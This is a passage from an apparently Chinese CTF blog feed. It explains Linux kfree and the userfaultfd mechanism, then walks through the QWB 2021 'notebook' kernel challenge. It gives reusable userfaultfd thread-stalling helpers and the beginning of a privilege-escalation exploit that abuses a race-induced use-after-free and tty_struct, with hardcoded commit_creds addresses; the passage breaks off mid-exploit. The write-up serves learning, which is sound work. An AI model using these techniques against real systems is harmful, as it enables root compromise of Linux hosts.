class="hljs-type">void</span> *object = (<span class="hljs-type">void</span> *)x;<br><br>page = virt_to_head_page(x);<br><span class="hljs-keyword">if</span> (unlikely(!PageSlab(page))) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = compound_order(page);<br><br>BUG_ON(!PageCompound(page));<br>kfree_hook(object);<br>mod_node_page_state(page_pgdat(page), NR_SLAB_UNRECLAIMABLE,<br>    -(<span class="hljs-number">1</span> &lt;&lt; order));<br>__free_pages(page, order);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>slab_free(page-&gt;slab_cache, page, object, <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><ul><li>使用virt_to_head_page函数将虚拟地址转化为page结构体</li><li>通过PageSlab查看page的是否设置PG_slab标识<ul><li>没有则是从buddy system中分配的，使用__free_pages放回buddy system</li><li>否则调用slab_free放回对应slab</li></ul></li></ul><h1 id="页表体系"><a href="#页表体系" class="headerlink" title="页表体系"></a>页表体系</h1><p>就放两张图，调试启动流程的时候对这玩意有深刻的认识了(ˉ▽ˉ；)…</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E5%9B%9B%E7%BA%A7%E9%A1%B5%E8%A1%A8.png" class title="四级页表"><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E5%9B%9B%E7%BA%A7%E9%A1%B5%E8%A1%A82.png" class title="四级页表2">]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Source Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>memory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>userfaultfd</title>
    <link href="/2023/11/08/kernel-userfaultfd/"/>
    <url>/2023/11/08/kernel-userfaultfd/</url>
    
    <content type="html"><![CDATA[<p>重启kernel！</p><p>发现我真的很容易钻牛角尖(ˉ▽ˉ；)…，之后的学习会以做出题为第一目标</p><span id="more"></span><h1 id="userfaultfd机制"><a href="#userfaultfd机制" class="headerlink" title="userfaultfd机制"></a>userfaultfd机制</h1><p>linux的一种缺页处理机制，可以用户态自定义函数处理缺页处理机制</p><p>放一张典中典的图</p><img src="/2023/11/08/kernel-userfaultfd/%E5%85%B8%E4%B8%AD%E5%85%B8.png" class title="典中典"><p>使用userfaultfd系统调用需要：</p><ul><li>注册一个userfaultfd，通过ioctl监视一块内存</li><li>启动一个用于轮询的线程uffd monitor，该线程通过poll不断轮询直到出现缺页异常</li></ul><p>大致流程：</p><ul><li><p>某个线程在被监视内存产生缺页异常（比如第一次访问一个匿名页），该线程（faulting线程）进入内核处理缺页异常</p></li><li><p>内核调用handle_userfault交由userfaultfd处理</p></li><li><p>userfaultfd将faulting线程休眠，并发送一个uffd_msg给monitor线程，等待其处理结束</p></li><li><p>monitor线程执行对应函数，并在ioctl处理缺页异常完毕后发送信号唤醒faulting线程</p><p>ioctl选项：</p><ul><li>UFFDIO_COPY：将用户自定义数据拷贝到faulting page上</li><li>UFFDIO_ZEROPAGE：将faulting page置0</li><li>UFFDIO_WAKE：用于配合上面两项中UFFDIO_COPY_MODE_DONTWAKE和UFFDIO_ZEROPAGE_MODE_DONTWAKE模式实现批量填充</li></ul></li></ul><h1 id="userfaultfd用法（kernel板子）"><a href="#userfaultfd用法（kernel板子）" class="headerlink" title="userfaultfd用法（kernel板子）"></a>userfaultfd用法（kernel板子）</h1><h2 id="相关宏定义，结构体"><a href="#相关宏定义，结构体" class="headerlink" title="相关宏定义，结构体"></a>相关宏定义，结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_API ((uint64_t)0xAA)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _UFFDIO_REGISTER(0x00)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _UFFDIO_COPY(0x03)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _UFFDIO_API(0x3F)</span><br><br><span class="hljs-comment">/* userfaultfd ioctl ids */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO 0xAA</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_API_IOWR(UFFDIO, _UFFDIO_API,\</span><br><span class="hljs-meta">      struct uffdio_api)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_IOWR(UFFDIO, _UFFDIO_REGISTER, \</span><br><span class="hljs-meta">      struct uffdio_register)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_COPY_IOWR(UFFDIO, _UFFDIO_COPY,\</span><br><span class="hljs-meta">      struct uffdio_copy)</span><br><br><span class="hljs-comment">/* read() structure */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> &#123;</span><br><span class="hljs-type">uint8_t</span>event;<br><br><span class="hljs-type">uint8_t</span>reserved1;<br><span class="hljs-type">uint16_t</span>reserved2;<br><span class="hljs-type">uint32_t</span>reserved3;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">uint64_t</span>flags;<br><span class="hljs-type">uint64_t</span>address;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">uint32_t</span> ptid;<br>&#125; feat;<br>&#125; pagefault;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">uint32_t</span>ufd;<br>&#125; fork;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">uint64_t</span>from;<br><span class="hljs-type">uint64_t</span>to;<br><span class="hljs-type">uint64_t</span>len;<br>&#125; remap;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">uint64_t</span>start;<br><span class="hljs-type">uint64_t</span>end;<br>&#125; remove;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* unused reserved fields */</span><br><span class="hljs-type">uint64_t</span>reserved1;<br><span class="hljs-type">uint64_t</span>reserved2;<br><span class="hljs-type">uint64_t</span>reserved3;<br>&#125; reserved;<br>&#125; arg;<br>&#125; __attribute__((packed));<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFD_EVENT_PAGEFAULT0x12</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> api;<br>    <span class="hljs-type">uint64_t</span> features;<br>    <span class="hljs-type">uint64_t</span> ioctls;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_range</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> start;<br>    <span class="hljs-type">uint64_t</span> len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_range</span> <span class="hljs-title">range</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_MODE_MISSING((uint64_t)1&lt;&lt;0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_REGISTER_MODE_WP((uint64_t)1&lt;&lt;1)</span><br>    <span class="hljs-type">uint64_t</span> mode;<br>    <span class="hljs-type">uint64_t</span> ioctls;<br>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> &#123;</span><br><span class="hljs-type">uint64_t</span> dst;<br><span class="hljs-type">uint64_t</span> src;<br><span class="hljs-type">uint64_t</span> len;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UFFDIO_COPY_MODE_DONTWAKE((uint64_t)1&lt;&lt;0)</span><br><span class="hljs-type">uint64_t</span> mode;<br><span class="hljs-type">int64_t</span> copy;<br>&#125;;<br><br><span class="hljs-comment">//#include &lt;linux/userfaultfd.h&gt;</span><br><br><span class="hljs-type">char</span> temp_page_for_stuck[<span class="hljs-number">0x1000</span>];<br></code></pre></td></tr></table></figure><h2 id="register-userfaultfd-for-thread-stucking"><a href="#register-userfaultfd-for-thread-stucking" class="headerlink" title="register_userfaultfd_for_thread_stucking"></a>register_userfaultfd_for_thread_stucking</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_userfaultfd_for_thread_stucking</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *monitor_thread, </span><br><span class="hljs-params">                                          <span class="hljs-type">void</span> *buf, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len)</span><br>&#123;<br>    register_userfaultfd(monitor_thread, buf, len, <br>                         uffd_handler_for_stucking_thread);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>创建一个uffd</li><li>设置api，初始化uffd接口并获取其支持的特性</li><li>注册监视的内存区域</li><li>创建monitor线程</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">register_userfaultfd</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *monitor_thread, <span class="hljs-type">void</span> *addr,</span><br><span class="hljs-params">                          <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> *(*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* 1. userfaultfd系统调用创建并返回一个uffd，类似一个文件的fd */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* 2. 创建一个uffdio_api结构体，用于指定uffd接口的版本和支持的特性 */</span><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* 3. 创建一个uffdio_register结构体，注册监视的内存区域 */</span><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<span class="hljs-comment">// 起始地址</span><br>    uffdio_register.range.len = len;  <span class="hljs-comment">// 监视的内存大小</span><br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<span class="hljs-comment">// 监视模式</span><br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* 4. 启动monitor线程 */</span><br>    s = pthread_create(monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="uffd-handler-for-stucking-thread"><a href="#uffd-handler-for-stucking-thread" class="headerlink" title="uffd_handler_for_stucking_thread"></a>uffd_handler_for_stucking_thread</h2><ul><li>启动poll轮询</li><li>读取uffd_msg结构体</li><li>sleep卡住</li><li>ioctl分配物理内存并拷贝</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">uffd_handler_for_stucking_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) args;<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">/* 1. 创建一个pollfd结构体，启动poll轮询 */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* 2. 读取返回的uffd_msg结构体 */</span><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-comment">/* 3. 卡住 */</span><br>        sleep(<span class="hljs-number">100000000</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;read&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT) &#123;<br>            err_exit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* 4. 创建uffdio_copy结构体，ioctl-UFFDIO_COPY处理这个userfault */</span><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) temp_page_for_stuck;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                                    ~(<span class="hljs-number">0x1000</span> - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = <span class="hljs-number">0x1000</span>;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="例题：强网杯2021线上赛-notebook"><a href="#例题：强网杯2021线上赛-notebook" class="headerlink" title="例题：强网杯2021线上赛 - notebook"></a>例题：强网杯2021线上赛 - notebook</h1><h2 id="漏洞和利用"><a href="#漏洞和利用" class="headerlink" title="漏洞和利用"></a>漏洞和利用</h2><p>有一个全局的lock用来保护notebook全局数组</p><p>理论上来说noteadd、notedel、noteedit函数都应该用写锁，但noteadd和noteedit用的是读锁，读锁允许多个读线程同时进入，就产生了条件竞争</p><h3 id="noteedit"><a href="#noteedit" class="headerlink" title="noteedit"></a>noteedit</h3><p>如果edit的size和原来的size不一样会使用krealloc重新分配内存，krealloc的size如果是0的话会释放原chunk但不会分配新chunk</p><img src="/2023/11/08/kernel-userfaultfd/edit.png" class title="edit"><p>需要注意一下noteedit的处理顺序</p><ul><li>更改size</li><li>krealloc重新分配内存</li><li>copy_from_user从用户空间读取数据</li><li>根据size进行判断并更改notebook</li></ul><h3 id="noteadd"><a href="#noteadd" class="headerlink" title="noteadd"></a>noteadd</h3><img src="/2023/11/08/kernel-userfaultfd/add.png" class title="add"><p>注意一下noteadd的处理顺序</p><ul><li>保存原size</li><li>更改size</li><li>copy_from_user从用户空间读取数据</li><li>判断是否已有note，没有的话kmalloc分配内存</li></ul><h3 id="userfaultfd在kernel中的利用"><a href="#userfaultfd在kernel中的利用" class="headerlink" title="userfaultfd在kernel中的利用"></a>userfaultfd在kernel中的利用</h3><p>由于在利用ioctl处理完缺页异常之后才会唤醒faulting线程，所以我们可以在monitor的ioctl之前加一个长时间的休眠卡住这个线程，由于无锁（锁没用），我们就可以利用条件竞争造一个uaf</p><p>主要流程</p><ul><li>新开一个线程noteedit释放tty_struct大小的chunk，然后利用copy_from_user卡住</li><li>新开一个线程noteadd修改堆块大小，因为read和write堆块都需要查验大小</li><li>主线程进行tty_struct的篡改和利用</li></ul><p><strong>ps：noteedit和noteadd的线程会一直卡到利用结束之后，所以不需要考虑copy_from_user完之后的事</strong></p><p>另外，userfaultfd分配物理内存的时间是最后的ioctl，所以本题可以使用一块userfaultfd内存卡两次，因为触发第二次copy_from_user时第一次缺页异常还在卡着没分配物理内存</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>注意</p><ul><li>驱动的text段和bss段加载的时候不是连着的，记得看一下加载基址</li><li><strong>看加载基址！</strong>驱动加载基址不一定是0xffffffffc0000000</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NOTE_NUM 0x10</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> &#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">KernelNotebook</span> &#123;</span><br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">size_t</span> size;<br>&#125;;<br><br><span class="hljs-type">int</span> note_fd;<br><span class="hljs-type">sem_t</span> evil_add_sem, evil_edit_sem;<br><span class="hljs-type">char</span> *uffd_buf;<br><span class="hljs-type">char</span> temp_page[<span class="hljs-number">0x1000</span>] = &#123; <span class="hljs-string">&quot;arttnba3&quot;</span> &#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteGift</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span 